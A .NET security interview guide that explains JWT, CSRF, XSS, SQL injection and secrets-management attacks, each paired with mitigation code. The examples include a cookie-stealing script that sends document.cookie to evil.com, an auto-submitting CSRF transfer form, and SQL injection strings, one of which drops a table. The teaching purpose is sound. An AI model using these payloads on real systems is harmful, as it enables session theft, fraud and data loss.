# 🔐 Security Interview Guide

> Authentication · JWT attacks · CSRF · XSS · SQL Injection · Password hashing · TLS · API security · Secret management
> Every topic: attack vector → exploit → mitigation with .NET code.

---

## 📋 Table of Contents

1. [Authentication vs Authorization](#1-authentication-vs-authorization)
2. [JWT Deep Dive & Attacks](#2-jwt-deep-dive--attacks)
3. [CSRF (Cross-Site Request Forgery)](#3-csrf-cross-site-request-forgery)
4. [XSS (Cross-Site Scripting)](#4-xss-cross-site-scripting)
5. [SQL Injection](#5-sql-injection)
6. [Password Hashing](#6-password-hashing)
7. [HTTPS / TLS Basics](#7-https--tls-basics)
8. [API Security](#8-api-security)
9. [Secret Management](#9-secret-management)

---

## 1. Authentication vs Authorization

> 📚 Reference: https://learn.microsoft.com/en-us/aspnet/core/security/

### Definition

**Authentication (AuthN)** — *Who are you?* Verifies identity (JWT, cookie, API key).  
**Authorization (AuthZ)** — *What can you do?* Checks permissions after identity is known.

```csharp
// Authentication: read token → populate User (ClaimsPrincipal)
app.UseAuthentication();   // MUST come before UseAuthorization

// Authorization: check User has required claims/roles/policy
app.UseAuthorization();

// ❌ Wrong order — authorization runs before user is set → always 403
app.UseAuthorization();
app.UseAuthentication();

// Controller-level:
[Authorize]                           // any authenticated user
[Authorize(Roles = "Admin")]          // must have Admin role
[Authorize(Policy = "CanApproveOrders")] // must satisfy policy

// Policy definition
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("CanApproveOrders", policy =>
        policy.RequireRole("Manager", "Admin")
              .RequireClaim("department", "finance")
              .RequireAssertion(ctx =>
                  ctx.User.FindFirst("approval_limit") is { } c &&
                  decimal.Parse(c.Value) >= 10_000));
});
```

### Common Auth Schemes

| Scheme | How | Use for |
|--------|-----|---------|
| JWT Bearer | Token in `Authorization: Bearer` header | SPAs, mobile, APIs |
| Cookie | Browser sends cookie automatically | Server-rendered web apps |
| API Key | Key in header or query string | Server-to-server, simple APIs |
| OAuth2 + OIDC | Delegated auth via Identity Provider | Third-party login (Google, Microsoft) |
| mTLS | Client certificate | Microservice-to-microservice |

---

## 2. JWT Deep Dive & Attacks

> 📚 Reference: https://jwt.io/

### JWT Structure
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9    ← Header (base64)
.
eyJzdWIiOiIxMjMiLCJyb2xlIjoiQWRtaW4ifQ  ← Payload (base64, NOT encrypted)
.
HMACSHA256(header + "." + payload, secret) ← Signature

Header:  { "alg": "HS256", "typ": "JWT" }
Payload: { "sub": "123", "email": "alice@test.com", "role": "Admin", "exp": 1735689600 }
```

**JWT is signed, NOT encrypted.** Payload is base64 — anyone can decode it. Never put secrets in JWT payload.

---

### Attack 1: Algorithm Confusion ("alg:none")

❌ **Vulnerable** — accepting `alg:none` allows forging tokens with no signature:
```csharp
// Attacker crafts: { "alg": "none" } header + { "role": "Admin" } payload + empty signature
// If server accepts alg:none → attacker is Admin without knowing secret key

// Old/misconfigured JWT libraries accepted this
```

✅ **Mitigation** — explicitly specify allowed algorithms:
```csharp
options.TokenValidationParameters = new TokenValidationParameters
{
    ValidAlgorithms        = new[] { SecurityAlgorithms.HmacSha256 }, // whitelist only HS256
    ValidateIssuerSigningKey = true,
    IssuerSigningKey         = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(secret))
    // "none" algorithm is rejected automatically
};
```

---

### Attack 2: HS256/RS256 Confusion

If server uses RS256 (asymmetric — signs with private key, verifies with public key), attacker can use the **public key** as the HS256 HMAC secret to forge tokens.

✅ **Mitigation** — validate algorithm matches expected:
```csharp
// Always specify which algorithm you expect
ValidAlgorithms = new[] { SecurityAlgorithms.RsaSha256 };
// If algorithm in token != RsaSha256 → rejected
```

---

### Attack 3: JWT Stored in localStorage → XSS Theft

❌ **Wrong** — storing JWT in localStorage:
```js
localStorage.setItem("token", jwt); // XSS can read this via document.cookie or localStorage
```

✅ **Better** — store JWT in `httpOnly` cookie (JS cannot read it):
```csharp
// Server sets httpOnly cookie
Response.Cookies.Append("access_token", jwt, new CookieOptions
{
    HttpOnly  = true,    // JS cannot access
    Secure    = true,    // HTTPS only
    SameSite  = SameSiteMode.Strict, // CSRF protection
    Expires   = DateTimeOffset.UtcNow.AddHours(1)
});
```

---

### Attack 4: Expired Token Accepted

❌ **Wrong** — not validating `exp` claim:
```csharp
// Missing ValidateLifetime = true → expired tokens accepted forever!
TokenValidationParameters = new TokenValidationParameters
{
    ValidateIssuerSigningKey = true,
    IssuerSigningKey         = key
    // ValidateLifetime not set → defaults to false in some libraries
};
```

✅ **Correct** — always validate lifetime:
```csharp
TokenValidationParameters = new TokenValidationParameters
{
    ValidateLifetime     = true,          // check exp claim
    ClockSkew            = TimeSpan.Zero  // no tolerance for expired tokens (default is 5 min!)
};
```

---

### Token Refresh Pattern
```csharp
// Issue short-lived access token + long-lived refresh token
public (string accessToken, string refreshToken) IssueTokens(User user)
{
    var access  = GenerateJwt(user, expiry: TimeSpan.FromMinutes(15)); // short-lived
    var refresh = GenerateOpaqueToken();                                // random 256-bit string

    // Store refresh token in DB (hashed) — can be revoked
    _db.RefreshTokens.Add(new RefreshToken
    {
        Token     = HashToken(refresh),
        UserId    = user.Id,
        ExpiresAt = DateTime.UtcNow.AddDays(30),
        IsRevoked = false
    });

    return (access, refresh);
}

// Exchange refresh token for new access token
public async Task<string> RefreshAsync(string refreshToken)
{
    var hashed = HashToken(refreshToken);
    var stored = await _db.RefreshTokens
        .FirstOrDefaultAsync(r => r.Token == hashed && !r.IsRevoked && r.ExpiresAt > DateTime.UtcNow)
        ?? throw new UnauthorizedException("Invalid or expired refresh token");

    // Rotate: invalidate old refresh token, issue new one
    stored.IsRevoked = true;
    var (access, newRefresh) = IssueTokens(await _db.Users.FindAsync(stored.UserId)!);
    await _db.SaveChangesAsync();

    return access;
}
```

---

## 3. CSRF (Cross-Site Request Forgery)

### Attack Vector
```
1. Alice logs into bank.com — browser stores session cookie
2. Alice visits evil.com
3. evil.com has: <form action="https://bank.com/transfer" method="POST">
                    <input name="to" value="attacker">
                    <input name="amount" value="10000">
                 </form>
                 <script>document.forms[0].submit()</script>
4. Browser automatically sends bank.com session cookie → transfer executes!
Alice never clicked anything
```

### Mitigations

**1. SameSite Cookie (modern, recommended):**
```csharp
// Strict: cookie only sent for same-site requests (breaks some cross-site flows)
// Lax: cookie sent for top-level GET navigation (allows most flows, protects POST)
Response.Cookies.Append("session", value, new CookieOptions
{
    SameSite = SameSiteMode.Strict,
    HttpOnly = true,
    Secure   = true
});
```

**2. CSRF Token (classic approach, for cookie-based auth):**
```csharp
// ASP.NET Core anti-forgery
builder.Services.AddAntiforgery(options =>
{
    options.HeaderName = "X-XSRF-TOKEN"; // JavaScript reads cookie, sends in header
});

// In Razor pages / MVC forms — auto-injected
@Html.AntiForgeryToken()  // <input type="hidden" name="__RequestVerificationToken" value="...">

// API controller — validate header
[ValidateAntiForgeryToken]
[HttpPost]
public IActionResult Transfer(TransferRequest req) { ... }
```

**3. Why JWT Bearer is CSRF-immune:**
```
Cookie: automatically sent by browser → CSRF possible
JWT in Authorization header: browser never auto-sends custom headers
  → CSRF attacker cannot set Authorization header from evil.com
  → JWT APIs using Bearer tokens are inherently CSRF-safe
```

---

## 4. XSS (Cross-Site Scripting)

### Attack Types

**Stored XSS** — malicious script saved to DB, served to all users:
```
Attacker posts comment: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
Server saves it. Alice views page → script executes → cookie stolen
```

**Reflected XSS** — script in URL parameter, reflected in response:
```
https://example.com/search?q=<script>alert(document.cookie)</script>
If server renders: <p>Results for: <script>alert(document.cookie)</script></p>
→ Executes in victim's browser
```

### Mitigations

**1. Encode output — never render raw user input:**
```csharp
// ❌ Wrong — raw user input rendered as HTML
return Content($"<p>Hello {username}</p>", "text/html"); // if username = <script>...</script>

// ✅ Correct — HTML encode before rendering
return Content($"<p>Hello {HtmlEncoder.Default.Encode(username)}</p>", "text/html");

// In Razor — automatic encoding by default
<p>Hello @Model.Username</p>     // ✅ Razor encodes automatically
<p>Hello @Html.Raw(Model.Username)</p> // ❌ @Html.Raw bypasses encoding — dangerous!
```

**2. Content Security Policy (CSP) header:**
```csharp
app.Use(async (ctx, next) =>
{
    ctx.Response.Headers["Content-Security-Policy"] =
        "default-src 'self'; " +              // only load resources from same origin
        "script-src 'self' 'nonce-{nonce}'; " + // scripts need nonce or same-origin
        "style-src 'self' https://fonts.googleapis.com; " +
        "img-src 'self' data: https:; " +
        "object-src 'none'; " +               // no Flash/plugins
        "frame-ancestors 'none'";             // no iframes (clickjacking protection)
    await next();
});
// Even if XSS script injected, CSP blocks it from executing (no inline scripts allowed)
```

**3. HttpOnly cookies — XSS can't steal tokens:**
```
HttpOnly cookie: cannot be accessed via document.cookie
Even if XSS executes → cannot steal session cookie
```

---

## 5. SQL Injection

### Attack Vector
```sql
-- Login form: username = "alice'--", password = "anything"
-- Vulnerable query:
"SELECT * FROM Users WHERE Username = '" + username + "' AND Password = '" + password + "'"
-- Becomes:
SELECT * FROM Users WHERE Username = 'alice'--' AND Password = 'anything'
-- '--' comments out password check → login as alice without password!

-- Drop table attack: username = "'; DROP TABLE Users; --"
SELECT * FROM Users WHERE Username = ''; DROP TABLE Users; --' AND ...
```

### Mitigations

❌ **Wrong** — string concatenation:
```csharp
var sql = $"SELECT * FROM Users WHERE Username = '{username}'";
var user = await _db.Database.ExecuteSqlRawAsync(sql); // injectable!
```

✅ **Correct** — parameterised queries (parameters are never interpreted as SQL):
```csharp
// Raw SQL with parameters — safe
var user = await _db.Users
    .FromSqlRaw("SELECT * FROM Users WHERE Username = {0}", username)
    .FirstOrDefaultAsync();

// ADO.NET parameterised
var cmd = new SqlCommand("SELECT * FROM Users WHERE Username = @username", conn);
cmd.Parameters.AddWithValue("@username", username); // value never interpreted as SQL

// EF Core LINQ — always parameterised automatically
var user = await _db.Users
    .Where(u => u.Username == username) // EF generates: WHERE Username = @p0
    .FirstOrDefaultAsync();

// EF Core interpolated string — safe (uses FormattableString, not string)
var user = await _db.Users
    .FromSqlInterpolated($"SELECT * FROM Users WHERE Username = {username}")
    .FirstOrDefaultAsync();
```

### Second-Order SQL Injection
```
Attack: attacker registers username = "admin'--"
System stores it safely (parameterised).
Later, admin panel retrieves username and uses it in a different non-parameterised query:
  "UPDATE Users SET Password = '" + storedUsername + "' WHERE ..."
→ the stored malicious value is now injected

Mitigation: ALWAYS use parameterised queries, even when data "came from your own DB"
```

---

## 6. Password Hashing

### Why Not MD5/SHA256?

```
MD5 hash of "password123" = 482c811da5d5b4bc6d497ffa98491e38
→ Same input = same hash (deterministic)
→ Rainbow table attack: precomputed hashes for millions of passwords
→ "482c811d..." found in rainbow table → "password123"

BCrypt/Argon2: includes random SALT per password
"password123" + salt1 = $2a$12$uniquehash1
"password123" + salt2 = $2a$12$differenthash2
→ Same password → different hash → rainbow tables useless
→ Work factor (cost) makes brute force computationally expensive
```

### Implementation

❌ **Wrong** — MD5/SHA256 without salt:
```csharp
var hash = Convert.ToHexString(MD5.HashData(Encoding.UTF8.GetBytes(password)));
// Crackable in seconds with rainbow tables
```

✅ **Correct** — BCrypt with work factor:
```csharp
// Install: dotnet add package BCrypt.Net-Next

// Hash (on registration)
string hash = BCrypt.Net.BCrypt.HashPassword(plainPassword, workFactor: 12);
// $2a$12$<22-char-salt><31-char-hash>
// workFactor 12 = 2^12 = 4096 iterations → ~200ms per hash (too slow for brute force)

// Verify (on login)
bool isValid = BCrypt.Net.BCrypt.Verify(plainPassword, storedHash);

// ASP.NET Core Identity uses PBKDF2 by default
builder.Services.AddIdentity<ApplicationUser, IdentityRole>()
    .AddEntityFrameworkStores<AppDbContext>();
// Identity hashes with PBKDF2-SHA256, 10000 iterations + salt automatically
```

### Password Policy
```csharp
builder.Services.AddIdentity<ApplicationUser, IdentityRole>(options =>
{
    options.Password.RequiredLength         = 12;
    options.Password.RequireDigit           = true;
    options.Password.RequireUppercase       = true;
    options.Password.RequireNonAlphanumeric = true;
    options.Lockout.MaxFailedAccessAttempts = 5;
    options.Lockout.DefaultLockoutTimeSpan  = TimeSpan.FromMinutes(15);
    options.Lockout.AllowedForNewUsers      = true;
});
```

---

## 7. HTTPS / TLS Basics

### How TLS Handshake Works
```
Client                                    Server
  │── ClientHello (TLS version, ciphers) ──►│
  │                                          │
  │◄── ServerHello + Certificate ────────────│
  │                                          │
  │  Client verifies certificate:            │
  │  ✅ Signed by trusted CA (e.g. DigiCert)?│
  │  ✅ Hostname matches CN/SAN?             │
  │  ✅ Not expired or revoked?              │
  │                                          │
  │── Generate pre-master secret             │
  │── Encrypt with server's public key ──────►│
  │                                          ├─ Decrypt with private key
  │                                          ├─ Both derive session key
  │                                          │
  │◄─────────── Encrypted traffic ──────────►│
```

### HTTPS in .NET
```csharp
// Force HTTPS everywhere
app.UseHsts();            // Strict-Transport-Security header: browser always uses HTTPS
app.UseHttpsRedirection(); // Redirect HTTP → HTTPS

// HSTS header tells browser: always use HTTPS for this domain for next year
// Response: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

// Certificate pinning for HttpClient (microservice-to-microservice)
var handler = new HttpClientHandler();
handler.ServerCertificateCustomValidationCallback = (message, cert, chain, errors) =>
{
    // Pin to specific thumbprint — reject even valid certs from other CAs
    return cert?.GetCertHashString() == expectedThumbprint;
};
```

### Certificate Management
```bash
# Azure App Service — auto-renews Let's Encrypt / App Service Managed Certificate
# Never hardcode certificates in app code or Docker images

# ASP.NET Core dev certificate
dotnet dev-certs https --trust
```

---

## 8. API Security

### OWASP API Security Top 10 + Mitigations

**BOLA (Broken Object Level Authorization)** — accessing another user's data:
```csharp
// ❌ Wrong — any authenticated user can get any order
[HttpGet("orders/{id}")]
[Authorize]
public Task<IActionResult> GetOrder(Guid id)
    => Ok(await _db.Orders.FindAsync(id)); // returns ANY order

// ✅ Correct — scope to current user
[HttpGet("orders/{id}")]
[Authorize]
public async Task<IActionResult> GetOrder(Guid id)
{
    var userId = User.FindFirst("sub")!.Value;
    var order  = await _db.Orders
        .FirstOrDefaultAsync(o => o.Id == id && o.UserId == userId); // ownership check!
    return order is null ? NotFound() : Ok(order);
}
```

**Mass Assignment** — client sets fields they shouldn't:
```csharp
// ❌ Wrong — user can POST { "role": "Admin", "isAdmin": true }
public async Task<IActionResult> Update(User user)
{
    _db.Users.Update(user); // attacker escalates own privilege!
    await _db.SaveChangesAsync();
}

// ✅ Correct — accept DTO, map only allowed fields
public async Task<IActionResult> Update(UpdateProfileDto dto)
{
    var user     = await _db.Users.FindAsync(CurrentUserId);
    user!.Name   = dto.Name;   // only allowed fields
    user.Bio     = dto.Bio;
    // role, isAdmin NOT settable via this endpoint
    await _db.SaveChangesAsync();
}
```

**Security Headers:**
```csharp
app.Use(async (ctx, next) =>
{
    var headers = ctx.Response.Headers;
    headers["X-Content-Type-Options"]    = "nosniff";          // no MIME sniffing
    headers["X-Frame-Options"]           = "DENY";             // no iframes (clickjacking)
    headers["X-XSS-Protection"]          = "1; mode=block";    // legacy XSS filter
    headers["Referrer-Policy"]           = "strict-origin-when-cross-origin";
    headers["Permissions-Policy"]        = "camera=(), microphone=(), geolocation=()";
    await next();
});
```

---

## 9. Secret Management

### What Is a Secret?
Connection strings, API keys, JWT signing keys, certificates, passwords. **Secrets must NEVER be in source code or Docker images.**

### Violation Examples
```bash
# ❌ Secrets in appsettings.json (committed to git)
{
  "Jwt": { "Key": "SuperSecretKey12345!" },
  "ConnectionStrings": { "Default": "Server=prod;Password=MyPassword123" }
}

# ❌ Secrets in environment variables in docker-compose.yml (committed to git)
environment:
  - DB_PASSWORD=MyPassword123

# ❌ Secrets in Dockerfile
ENV JWT_SECRET=abc123
```

### Correct Approaches

**1. Azure Key Vault (production):**
```csharp
// Program.cs — load secrets from Key Vault
builder.Configuration.AddAzureKeyVault(
    new Uri($"https://{vaultName}.vault.azure.net/"),
    new DefaultAzureCredential());  // uses Managed Identity — no credentials needed!

// Secret "ConnectionStrings--Default" in Key Vault
// maps to ConnectionStrings:Default in config (-- becomes :)
var connStr = builder.Configuration.GetConnectionString("Default"); // reads from Key Vault
```

**2. .NET User Secrets (development only, never committed):**
```bash
dotnet user-secrets set "Jwt:Key" "my-local-dev-secret"
dotnet user-secrets set "ConnectionStrings:Default" "Server=localhost;..."
# Stored in: %APPDATA%\Microsoft\UserSecrets\<projectId>\secrets.json
# NEVER pushed to git
```

**3. Kubernetes Secrets:**
```bash
kubectl create secret generic db-secret \
  --from-literal=connection-string="Server=prod;Password=..."
# Stored base64-encoded in etcd; use RBAC to restrict access
# Use Azure Key Vault provider for AKS to sync secrets automatically
```

**4. Secret Rotation — zero-downtime:**
```csharp
// Load secrets dynamically — reload on change (Azure Key Vault SDK supports this)
builder.Configuration.AddAzureKeyVault(vaultUri, credential, new KeyVaultSecretManager());

// Connection string rotation: add new secret version, update app config, old version disabled
// Zero-downtime because Key Vault returns latest active version
```

### Secret Scanning in CI
```yaml
# GitHub Actions — detect secrets before they reach main
- name: Scan for secrets
  uses: trufflesecurity/trufflehog@main
  with:
    path: ./
    base: main
    head: HEAD

# Pre-commit hook (local)
# Install: pip install detect-secrets
# detect-secrets scan > .secrets.baseline
# detect-secrets audit .secrets.baseline
```

---

> ✅ **9 security topics** — attack vectors, exploits, and mitigations with .NET code.
>
> 💡 **Security cheat sheet:**
> - JWT: **sign with RS256 in production** (asymmetric — private key stays on server)
> - Passwords: **BCrypt work factor 12** or ASP.NET Core Identity (PBKDF2)
> - CSRF: **SameSite=Strict cookies** + **JWT Bearer is CSRF-immune**
> - SQL injection: **always parameterise — EF LINQ is safe; Raw SQL needs `{0}` or `@param`**
> - Secrets: **Azure Key Vault + Managed Identity** — zero credentials in code
> - Headers: **CSP + X-Frame-Options + X-Content-Type-Options** on every response

---

*Last updated: 2026 | .NET 8 / OWASP API Security 2023*
